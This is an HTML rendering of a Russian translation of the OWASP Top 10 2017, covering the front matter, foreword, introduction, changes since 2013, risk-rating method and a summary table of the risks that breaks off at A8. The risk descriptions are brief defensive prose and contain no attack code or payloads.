<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>OWASP Top 10 2017</title>
  <style>
    html {
      line-height: 1.5;
      font-family: Georgia, serif;
      font-size: 20px;
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 1em;
      }
    }
    @media print {
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
      font-size: 85%;
      margin: 0;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<header id="title-block-header">
<h1 class="title">OWASP Top 10 2017</h1>
</header>
<p><img src="images/OWASP_logo.png" alt="OWASP LOGO" /></p>
<h1 id="топ-10-owasp-2017">Топ-10 OWASP 2017</h1>
<p>Десять самых опасных уязвимостей веб-приложений</p>
<p><img src="images/front-wasp.png" alt="WASP Logo URL TBA" /></p>
<table>
<thead>
<tr class="header">
<th><img src="images/front-cc.png" alt="Creative Commons License Logo" /></th>
<th></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><a href="https://owasp.org">https://owasp.org</a></td>
<td>Данная работа выпущена под лицензией Creative Commons Attribution-ShareAlike 4.0 International License</td>
</tr>
</tbody>
</table>
<h1 id="релиз">Релиз</h1>
<h2 id="важное-сообщение">Важное сообщение</h2>
<h3 id="запрос-комментариев">Запрос комментариев</h3>
<p>Эта текстовая версия Топ-10 OWASP будет полезна переводчикам и другим заинтересованным лицам. Данная версия не является официальным релизом, который будет представлен документами в формате PowerPoint и PDF.</p>
<p>На данном этапе нам требуются:</p>
<ul>
<li><strong>переводы</strong> - несколько команд уже начали работу, но мы просим вас связаться с нами, если вы можете чем-то помочь.</li>
</ul>
<p>Настоятельно просим вносить все исправления или замечания на GitHub:</p>
<ul>
<li><a href="https://github.com/OWASP/Top10/issues"><a href="https://github.com/OWASP/Top10/issues">https://github.com/OWASP/Top10/issues</a></a></li>
</ul>
<p>Действуя публично и открыто, мы предоставляем возможность отслеживания и контроля, а также гарантируем, что все высказывания не останутся без внимания в течении последнего месяца перед публикацией.</p>
<ul>
<li>Эндрю ван дер Сток (Andrew van der Stock)</li>
<li>Брайан Глас (Brian Glas)</li>
<li>Нейл Смитлайн (Neil Smithline)</li>
<li>Торстен Гиглер (Torsten Gigler)</li>
</ul>
<h1 id="содержание">Содержание</h1>
<table>
<tbody>
<tr class="odd">
<td style="text-align: left;">С - Об OWASP</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0x01-about-owasp.md">1</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">П - Предисловие</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0x02-foreword.md">2</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">В - Введение</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0x05-introduction.md">3</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">ЧН - Что нового</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0x06-release-notes.md">4</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">Угрозы - Угрозы безопасности приложений</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0x10-app-security-risks.md">5</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">Т10 - Топ-10 угроз безопасности приложений OWASP – 2017</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0x11-t10.md">6</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">A1:2017 - Внедрение</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xa1-injection.md">7</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">A2:2017 - Недостатки аутентификации</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xa2-broken-authentication.md">8</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">A3:2017 - Разглашение конфиденциальных данных</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xa3-sensitive-data-disclosure.md">9</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">A4:2017 - Внешние сущности XML (XXE)</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xa4-xxe.md">10</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">A5:2017 - Недостатки контроля доступа</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xa5-broken-access-control.md">11</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">A6:2017 - Некорректная настройка параметров безопасности</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xa6-security-misconfiguration.md">12</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">A7:2017 - Межсайтовое выполнение сценариев (XSS)</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xa7-xss.md">13</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">A8:2017 - Небезопасная десериализация</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xa8-insecure-deserialization.md">14</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">A9:2017 - Использование компонентов с известными уязвимостями</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xa9-known-vulns.md">15</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">A10:2017 - Недостатки журналирования и мониторинга</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xaa-logging-detection-response.md">16</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">+Р - Что делать разработчикам</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xb0-next-devs.md">17</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">+Т - Что делать тестировщикам</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xb1-next-testing.md">18</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">+О - Что делать организациям</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xb2-next-org.md">19</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">+М - Что делать менеджерам приложений</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xb3-next-app-mgrs.md">20</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">+У - Об угрозах</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xc0-note-about-risks.md">21</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">+ФР - О факторах риска</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xc1-risk-factors.md">22</a></td>
</tr>
<tr class="odd">
<td style="text-align: left;">+МД - Методология и данные</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xd0-about-data.md">23</a></td>
</tr>
<tr class="even">
<td style="text-align: left;">+Б - Благодарности</td>
<td style="text-align: left;"></td>
<td style="text-align: right;"><a href="0xd1-data-contributors.md">24</a></td>
</tr>
</tbody>
</table>
<h1 id="об-owasp">Об OWASP</h1>
<p>Открытый проект по обеспечению безопасности веб-приложений (OWASP) — это открытое сообщество, позволяющее организациям разрабатывать, приобретать и поддерживать безопасные приложения и интерфейсы прикладного программирования (API).</p>
<p>OWASP бесплатно и в открытом доступе предлагает:</p>
<ul>
<li>стандарты и инструменты для обеспечения безопасности приложений;</li>
<li>полные версии книг по тестированию безопасности приложений, разработке безопасного кода, а также оценке безопасности кода;</li>
<li>презентации и <a href="https://www.youtube.com/user/OWASPGLOBAL">видео</a>.</li>
<li><a href="https://cheatsheetseries.owasp.org/">памятки</a> по большинству распространенных вопросов;</li>
<li>стандартные требования к безопасности и библиотеки;</li>
<li><a href="https://owasp.org/chapters/">локальные отделения по всему миру</a>;</li>
<li>передовые исследования;</li>
<li>крупные <a href="https://owasp.org/events/">конференции по всему миру</a>;</li>
<li><a href="https://lists.owasp.org/mailman/listinfo">списки рассылок</a>.</li>
</ul>
<p>Более подробная информация доступна на сайте: <a href="https://owasp.org"><a href="https://owasp.org">https://owasp.org</a></a>.</p>
<p>Все инструменты, документы, видео, презентации и отделения OWASP являются бесплатными и открытыми для тех, кто заинтересован в улучшении безопасности приложений.</p>
<p>Фонд выступает за подход к безопасности приложений с точки зрения людей, процессов и технологий, поскольку для наиболее эффективного обеспечения безопасности приложений требуются улучшения во всех этих областях.</p>
<p>OWASP представляет собой новый тип организации. Наша независимость от коммерческого влияния позволяет нам предоставлять беспристрастные, практические и эффективные данные по безопасности приложений.</p>
<p>OWASP не связан ни с одной технологической компанией, хотя поддерживает использование технологий промышленной безопасности. OWASP выпускает большое количество материалов, действуя прозрачно и открыто, а также всегда готов к сотрудничеству.</p>
<p>Фонд OWASP является некоммерческой организацией, что обеспечивает проекту долгосрочный успех. Почти все связанные с OWASP люди являются добровольцами, включая членов совета OWASP, руководителей отделений и проектов, а также участников проекта. Мы поддерживаем инновационные исследования в области безопасности, предоставляя гранты и инфраструктуру.</p>
<p>Присоединяйтесь к нам!</p>
<h2 id="авторские-права-и-лицензирование">Авторские права и Лицензирование</h2>
<p><img src="images/license.png" alt="license" /></p>
<p>Авторские права © 2003 - 2017 Фонд OWASP. Документ выпущен под лицензией Creative Commons Attribution Share-Alike 4.0. В случае переиспользования или распространения данного документа необходимо указывать условия лицензионного соглашения, действующие в его отношении.</p>
<h1 id="предисловие">Предисловие</h1>
<p>Ненадежное программное обеспечение подрывает безопасность критических инфраструктур, относящихся, например, к здравоохранению, обороне, энергетике или финансам. Программное обеспечение становится сложнее, устройств, подключенных к сети, становится больше, поэтому важность обеспечения безопасности приложений возрастает экспоненциально. Быстрое развитие методов разработки ПО приводит к необходимости быстро и безошибочно выявлять, а также устранять наиболее часто возникающие угрозы. Больше нельзя оставлять без должного внимания относительно простые угрозы безопасности, подобные представленным в данном списке Топ-10 OWASP.</p>
<p>При создании Топ-10 OWASP — 2017 было получено огромное количество отзывов, намного больше, чем по любым другим проектам OWASP. Это показывает, насколько сообщество заинтересовано в Топ-10 OWASP и насколько важно для OWASP сделать Топ-10 актуальным для большинства сценариев использования.</p>
<p>Несмотря на то, что первоначальная цель проекта Топ-10 OWASP заключалась в простом привлечении внимания разработчиков и менеджеров к проблемам безопасности, проект де-факто стал стандартом безопасности приложений.</p>
<p>В этом выпуске проблемы и рекомендации по их устранению описаны кратко и в доступной форме для облегчения внедрения Топ-10 OWASP в программы обеспечения безопасности приложений. Крупным и высокопроизводительным организациям, которым требуется настоящий стандарт, мы рекомендуем использовать <a href="https://owasp.org/www-project-application-security-verification-standard/">Стандарт подтверждения безопасности приложений OWASP (ASVS)</a>, но для большинства при обеспечении безопасности приложений будет достаточно Топ-10 OWASP.</p>
<p>Мы также составили перечни рекомендуемых шагов для разных категорий пользователей Топ-10 OWASP, такие как <strong>"Что делать разработчикам"</strong>, <strong>"Что делать тестировщикам"</strong>, <strong>"Что делать организациям"</strong> (для директоров по информационным технологиям и директоров по информационной безопасности), а также <strong>"Что делать менеджерам приложений"</strong> (для менеджеров приложений или лиц, ответственных за жизненный цикл приложений).</p>
<p>В конечном счете мы призываем все команды и организации, занимающиеся разработкой ПО, создать свою программу обеспечения безопасности приложений, которая будет соответствовать их культурному и технологическому уровню. Эти программы могут быть представлены в любой форме и объеме. Для оценки и улучшения существующей программы обеспечения безопасности приложений в вашей организации вы можете использовать <strong>Модель обеспечения безопасности ПО (SAMM)</strong>.</p>
<p>Надеемся, что Топ-10 OWASP окажется полезным при обеспечении безопасности ваших приложений. Все вопросы, комментарии и идеи вы можете оставлять в нашем проектном репозитории на GitHub:</p>
<ul>
<li><a href="https://github.com/OWASP/Top10/issues"><a href="https://github.com/OWASP/Top10/issues">https://github.com/OWASP/Top10/issues</a></a></li>
</ul>
<p>Топ-10 OWASP и переводы можно найти здесь:</p>
<ul>
<li><a href="https://owasp.org/www-project-top-ten/"><a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></a></li>
</ul>
<p>Наконец, мы хотим поблагодарить основателей проекта Топ-10 OWASP, Дейва Вичерса (Dave Wichers) и Джеффа Вильямса (Jeff Williams), за их вклад и веру в успешное завершение данного документа стараниями сообщества. Большое вам спасибо!</p>
<ul>
<li>Эндрю ван дер Сток (Andrew van der Stock)</li>
<li>Брайан Глас (Brian Glas)</li>
<li>Нил Смитлайн (Neil Smithline)</li>
<li>Торстен Гиглер (Torsten Gigler)</li>
</ul>
<h2 id="поддержка-проекта">Поддержка проекта</h2>
<p>Благодарим компанию <a href="https://www.autodesk.com">Autodesk</a> за спонсорскую поддержку Топ-10 OWASP — 2017.</p>
<p>Организации и отдельные лица, предоставившие данные по преобладающим уязвимостям или оказавшие иное содействие при создании списка, перечислены на странице <a href="0xd1-data-contributors.md">"Благодарности"</a>.</p>
<h1 id="в-введение">В Введение</h1>
<h2 id="представляем-топ-10-owasp--2017">Представляем Топ-10 OWASP — 2017</h2>
<p>Это крупное обновление включает в себя несколько новых категорий угроз, две из которых были выбраны сообществом (<strong>A8:2017-Небезопасная десериализация</strong> и <strong>A10:2017-Недостатки журналирования и мониторинга</strong>). Два ключевых отличия подготовки данной версии Топ-10 OWASP заключаются в активной обратной связи сообщества и внушительном объеме данных, полученном от десятков организаций, возможно, самом большом из когда-либо собранных при подготовке стандарта по обеспечению безопасности приложений. Все это дает нам уверенность в том, что новая версия Топ-10 OWASP посвящена самым актуальным проблемам безопасности приложений, с которыми сталкиваются организации в настоящее время.</p>
<p>Топ-10 OWASP — 2017 основан главным образом на более чем 40 комплектах данных, полученных от организаций, которые специализируются на безопасности приложений, а также на отраслевых исследованиях, проведенных более чем 500 независимыми исследователями. Данные содержат информацию об уязвимостях, обнаруженных в сотнях организаций и более чем 100 000 реальных приложений и API. На основе данных о распространенности, простоте эксплуатации и сложности обнаружения уязвимостей, а также ущербе, который они могут нанести, составляется список Топ-10.</p>
<p>Основной целью Топ-10 OWASP является ознакомление разработчиков, проектировщиков, архитекторов, менеджеров и организаций в целом с рисками, связанными с наиболее распространенными и существенными недостатками в безопасности веб-приложений. Топ-10 также предлагает базовые способы защиты от подобных рисков и руководства по дальнейшим действиям.</p>
<h2 id="дорожная-карта-дальнейших-действий">Дорожная карта дальнейших действий</h2>
<p><strong>Не останавливайтесь на 10</strong>. Существуют сотни угроз, которые могут повлиять на безопасность веб-приложений. Этой теме посвящены <a href="https://github.com/OWASP/DevGuide">Руководство разработчика OWASP</a> и <a href="https://cheatsheetseries.owasp.org/">Памятки OWASP</a>. Данные документы рекомендуются для прочтения всем разработчикам веб-приложений и API. Инструкции по эффективному обнаружению уязвимостей в веб-приложениях и API представлены в <a href="https://owasp.org/www-project-web-security-testing-guide/">Руководстве тестировщика OWASP</a>.</p>
<p><strong>Продолжайте совершенствоваться</strong>. Топ-10 OWASP не стоит на месте и продолжит меняться. Даже без внесения каких-либо правок в код в приложениях могут появиться уязвимости, поскольку обнаруживаются новые векторы атак, а методы эксплуатации уязвимостей совершенствуются. Для получения дополнительной информации рекомендуем ознакомиться с советами, представленными в конце Топ-10 в разделах <strong>Что делать Разработчикам, Тестировщикам, Организациям и Менеджерам приложений</strong>.</p>
<p><strong>Мыслите позитивно</strong>. Если вы хотите прекратить искать уязвимости и готовы перейти к созданию надежной системы обеспечения безопасности приложений, то в качестве отправной точки для разработчиков может послужить проект <a href="https://owasp.org/www-project-proactive-controls/">Реализации проактивной защиты OWASP</a>, а <a href="https://owasp.org/www-project-application-security-verification-standard/">Стандарт подтверждения безопасности приложений OWASP (ASVS)</a> станет хорошим руководством по выбору параметров, которые необходимо контролировать в организациях и приложениях.</p>
<p><strong>Используйте инструменты грамотно</strong>. Уязвимости могут быть комплексными и скрываться глубоко в коде. В большинстве случаев наиболее эффективным подходом к поиску и устранению недостатков в безопасности является привлечение экспертов, вооруженных продвинутыми инструментами. Но не рекомендуется полагаться исключительно на инструменты, поскольку это дает ложное ощущение безопасности.</p>
<p><strong>Развивайтесь во всех направлениях</strong>. Сосредоточьтесь на том, чтобы сделать безопасность неотъемлемой частью вашей культуры разработки. Дополнительную информацию можно получить, ознакомившись с <a href="https://owasp.org/www-project-samm/">Моделью обеспечения безопасности ПО (SAMM)</a>.</p>
<h2 id="источники">Источники</h2>
<p>Мы благодарны организациям, которые предоставили информацию об уязвимостях для выпуска обновления 2017 года. На призыв о сборе данных мы получили более 40 откликов. Впервые все данные, собранные для выпуска Топ-10, а также полный список участников проекта доступен публично. Мы полагаем, что это одна из самых больших и разносторонних баз данных по уязвимостям, которая когда-либо собиралась публично.</p>
<p>Поскольку участников проекта намного больше, чем доступного здесь места, мы создали специальную страницу с указанием внесенного ими вклада. Мы искренне благодарим организации за их решение оказаться на передовой и поделиться своими данными с сообществом. Надеемся, что подобная практика будет продолжаться и все больше организаций будет в этом участвовать; возможно, это станет одним из ключевых этапов в реализации безопасности на основе фактических данных. Создание Топ-10 OWASP было бы невозможным без участия всех этих удивительных людей.</p>
<p>Также мы хотим поблагодарить более чем 500 участников проекта, которые потратили свое время на завершение данного исследования. Мнения этих людей помогли выделить две новые категории для Топ-10. Мы ценим все комментарии, высказывания и критические отзывы, а также потраченное время и хотим выразить вам нашу благодарность.</p>
<p>Хотим поблагодарить участников, которые оставляли свои конструктивные замечания и тратили время на рецензирование нового выпуска Топ-10. На сколько это возможно, мы перечислили их на странице <strong>Благодарности</strong>.</p>
<p>И наконец, хотим заранее поблагодарить всех переводчиков, которые будут переводить данный выпуск Топ-10 на различные языки, помогая тем самым сделать Топ-10 OWASP более доступным.</p>
<h1 id="чн-что-нового">ЧН Что нового</h1>
<h2 id="что-изменилось-в-2017-году-по-сравнению-с-2013-м">Что изменилось в 2017 году по сравнению с 2013-м?</h2>
<p>Многое изменилось за последние четыре года, поэтому Топ-10 OWASP также требовались изменения. Мы полностью реорганизовали Топ-10, обновили методологию, применили новый процесс сбора данных, наладили взаимодействие с сообществом, пересмотрели уровни значимости, переписали все угрозы с нуля и добавили ссылки на наиболее распространенные фреймворки и языки.</p>
<p>За последние годы основные технологии и архитектура приложений сильно изменились:</p>
<ul>
<li>Микросервисы, написанные на node.js и Spring Boot, заменяют традиционные монолитные приложения. С приходом микросервисов прибавилось проблем с безопасностью, таких как установление доверия между микросервисами, контейнерами, управление критически важными данными. Код, к которому раньше не предполагалось обращение через интернет, теперь располагается за API или веб-сервисами RESTful и может быть использован одностраничными и мобильными приложениями. Архитектурные допущения в коде, касающиеся, например, доверенных вызывающих функций, более не актуальны.</li>
<li>Одностраничные приложения, разработанные с использованием JavaScript-фреймворков (таких как Angular и React), позволяют создавать многофункциональные, модульные интерфейсы. Функциональные возможности клиентов, которые традиционно обеспечивались на стороне сервера, также добавляют проблем с безопасностью.</li>
<li>JavaScript в настоящее время является основным языком в интернете, node.js работает на стороне сервера, а современные веб-фреймворки (такие как Bootstrap, Electron, Angular и React) запускаются в клиентах.</li>
</ul>
<h2 id="новые-угрозы-выделенные-на-основе-данных">Новые угрозы, выделенные на основе данных</h2>
<ul>
<li><strong>A4:2017-Внешние сущности XML (XXE)</strong> — новая категория, выделенная на основе данных, полученных при помощи инструментов тестирования безопасности исходного кода (<a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a>).</li>
</ul>
<h2 id="новые-угрозы-выделенные-сообществом">Новые угрозы, выделенные сообществом</h2>
<p>Мы попросили сообщество рассмотреть две перспективные категории угроз. Было получено более чем 500 рецензий, после исключения уже выделенных угроз (таких как "Разглашение конфиденциальных данных" и "Внешние сущности XML") были выбраны следующие категории:</p>
<ul>
<li><strong>A8:2017-Небезопасная десериализация</strong>, которая позволяет удаленно выполнить код или осуществить действия с критически важными объектами.</li>
<li><strong>A10:2017-Недостатки журналирования и мониторинга</strong>, которые могут помешать обнаружению вредоносных действий или взломов, реагированию на инциденты, а также расследованию киберпреступлений.</li>
</ul>
<h2 id="объединенные-или-исключенные-но-не-забытые">Объединенные или исключенные, но не забытые</h2>
<ul>
<li><strong>A4-Небезопасные прямые ссылки на объекты</strong> и <strong>A7-Отсутствие контроля доступа на функциональном уровне</strong> объединены в <strong>A5:2017-Недостатки контроля доступа</strong>.</li>
<li><strong>A8-Межсайтовая подмена запросов (CSRF)</strong> была обнаружена только в 5% приложений, поскольку большинство фреймворков имеют <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">средства защиты от CSRF</a>.</li>
<li><strong>A10-Непроверенные перенаправления и переадресации</strong> были обнаружены примерно в 8% приложений, но данная категория была вытеснена <strong>Внешними сущностями XML (XXE)</strong>.</li>
</ul>
<p><img src="images/0x06-release-notes-1.png" alt="0x06-release-notes-1" /></p>
<h1 id="угрозы---угрозы-безопасности-приложений">Угрозы - Угрозы безопасности приложений</h1>
<h2 id="что-такое-угрозы-безопасности-приложений">Что такое угрозы безопасности приложений?</h2>
<p>Злоумышленники могут нанести ущерб вашему бизнесу или организации, используя ваше приложение. Подобные способы использования приложения представляют собой угрозы, которые могут являться, а могут не являться достаточно серьезными, чтобы обращать на них внимание.</p>
<p><img src="images/0x10-risk-1.png" alt="Угрозы безопасности приложений" /></p>
<p>Иногда эти способы легко найти и эксплуатировать, иногда — очень сложно. Аналогичная ситуация с возможным ущербом: его может не быть совсем или он может лишить вас бизнеса. Чтобы определить риски для вашей организации, оцените вероятности, связанные с источниками угроз, векторами атак и недостатками безопасности, а затем объедините их с оценкой технического и репутационного вреда для вашей организации. Сумма этих факторов определяет совокупный риск.</p>
<h2 id="что-мне-грозит">Что мне грозит</h2>
<p>Главной задачей <a href="https://owasp.org/www-project-top-ten/">Топ-10 OWASP</a> является определение наиболее серьезных угроз безопасности веб-приложений для широкого круга организаций. Для каждой из этих угроз дается общая информация о вероятности ее возникновения и возможных технических последствиях, полученная и использованием <a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">Методики оценки рисков OWASP</a>.</p>
<table>
<thead>
<tr class="header">
<th>Источники угроз</th>
<th>Сложность эксплуатации</th>
<th>Распространенность уязвимости</th>
<th>Сложность обнаружения</th>
<th>Технические последствия</th>
<th>Последствия для бизнеса</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит</td>
<td>Просто: 3</td>
<td>Очень распространенная: 3</td>
<td>Просто: 3</td>
<td>Тяжелые: 3</td>
<td>Зависит</td>
</tr>
<tr class="even">
<td>от</td>
<td>Средне: 2</td>
<td>Распространенная: 2</td>
<td>Средне: 2</td>
<td>Умеренные: 2</td>
<td>от</td>
</tr>
<tr class="odd">
<td>приложения</td>
<td>Сложно: 1</td>
<td>Редкая: 1</td>
<td>Сложно: 1</td>
<td>Незначительные: 1</td>
<td>бизнеса</td>
</tr>
</tbody>
</table>
<p>В этом выпуске мы обновили систему оценки рисков для облегчения расчета вероятности возникновения и возможного ущерба для любой угрозы. Более подробную информацию можно узнать в разделе <a href="0xc0-note-about-risks.md">Об угрозах</a>. </p>
<p>Нет одинаковых организаций, как нет одинаковых злоумышленников, целей и последствий атак. Если общественная организация использует некую систему управления контентом (CMS) для публикации новостей, а медицинское учреждение использует такую же систему для хранения медицинских данных, то угрозы и риски для этих организаций будут сильно отличаться. Очень важно определять риски для вашей организации, исходя из применимых к ней угроз и возможных последствий атак.</p>
<p>Где это возможно, для унификации общепринятых наименований и снижения риска возникновения путаницы, названия угроз в Топ-10 соответствуют названиям уязвимостей из списка <a href="https://cwe.mitre.org/">CWE</a>.</p>
<h2 id="ссылки">Ссылки</h2>
<h3 id="owasp">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">Методика оценки рисков OWASP</a></li>
<li><a href="https://owasp.org/www-community/Threat_Modeling">Раздел о моделировании угроз/рисков</a></li>
</ul>
<h3 id="сторонние">Сторонние</h3>
<ul>
<li><a href="https://www.iso.org/iso-31000-risk-management.html">ISO 31000: Менеджмент рисков</a></li>
<li><a href="https://www.iso.org/isoiec-27001-information-security.html">ISO 27001: Менеджмент информационной безопасности</a></li>
<li><a href="https://www.nist.gov/cyberframework">Фреймворк кибербезопасности NIST (US)</a></li>
<li><a href="https://www.cyber.gov.au/acsc/view-all-content/publications/strategies-mitigate-cyber-security-incidents">Методы устранения последствий кибератак (AU)</a></li>
<li><a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator">NIST CVSS 3.0</a></li>
<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">Средства моделирования угроз Microsoft</a></li>
</ul>
<h1 id="т10-топ-10-owasp-угрозы-безопасности-приложений--2017">Т10 Топ-10 OWASP Угрозы безопасности приложений – 2017</h1>
<table>
<thead>
<tr class="header">
<th>Угроза</th>
<th>Описание</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>A1:2017-Внедрение</strong></td>
<td>Уязвимости, связанные, например, с внедрением SQL, NoSQL, OS и LDAP, возникают, когда непроверенные данные отправляются интерпретатору в составе команды или запроса. Вредоносные данные могут заставить интерпретатор выполнить непредусмотренные команды или обратиться к данным без прохождения соответствующей авторизации.</td>
</tr>
<tr class="even">
<td><strong>A2:2017-Недостатки аутентификации</strong></td>
<td>Функции приложений, связанные с аутентификацией и управлением сессиями, часто некорректно реализуются, позволяя злоумышленникам скомпрометировать пароли, ключи или сессионные токены, а также эксплуатировать другие ошибки реализации для временного или постоянного перехвата учетных записей пользователей.</td>
</tr>
<tr class="odd">
<td><strong>A3:2017-Разглашение конфиденциальных данных</strong></td>
<td>Многие веб-приложения и API имеют плохую защиту важных финансовых, медицинских или персональных данных. Злоумышленники могут похитить или изменить эти данные, а затем осуществить мошеннические действия с кредитными картами или персональными данными. Конфиденциальные данные требуют дополнительных мер защиты, например их шифрования при хранении или передаче, а также специальных мер предосторожности при работе с браузером.</td>
</tr>
<tr class="even">
<td><strong>A4:2017-Внешние сущности XML (XXE)</strong></td>
<td>Старые или плохо настроенные XML-процессоры обрабатывают ссылки на внешние сущности внутри документов. Эти сущности могут быть использованы для доступа к внутренним файлам через обработчики URI файлов, общие папки, сканирование портов, удаленное выполнения кода и отказ в обслуживании.</td>
</tr>
<tr class="odd">
<td><strong>A5:2017-Недостатки контроля доступа</strong></td>
<td>Действия, разрешенные аутентифицированным пользователям, зачастую некорректно контролируются. Злоумышленники могут воспользоваться этими недостатками и получить несанкционированный доступ к учетным записям других пользователей или конфиденциальной информации, а также изменить пользовательские данные или права доступа.</td>
</tr>
<tr class="even">
<td><strong>A6:2017-Некорректная настройка параметров безопасности</strong></td>
<td>Некорректная настройка безопасности является распространенной ошибкой. Это происходит из-за использования стандартных параметров безопасности, неполной или специфичной настройки, открытого облачного хранения, некорректных HTTP-заголовков и подробных сообщений об ошибках, содержащих критически важные данные. Все ОС, фреймворки, библиотеки и приложения должны быть не только настроены должным образом, но и своевременно корректироваться и обновляться.</td>
</tr>
<tr class="odd">
<td><strong>A7:2017-Межсайтовое выполнение сценариев (XSS)</strong></td>
<td>XSS имеет место, когда приложение добавляет непроверенные данные на новую веб-страницу без их соответствующей проверки или преобразования, или когда обновляет открытую страницу через API браузера, используя предоставленные пользователем данные, содержащие HTML- или JavaScript-код. С помощью XSS злоумышленники могут выполнять сценарии в браузере жертвы, позволяющие им перехватывать пользовательские сессии, подменять страницы сайта или перенаправлять пользователей на вредоносные сайты.</td>
</tr>
<tr class="even">
<td><strong>A8:2017-Небезопасная десериализация</strong></td>
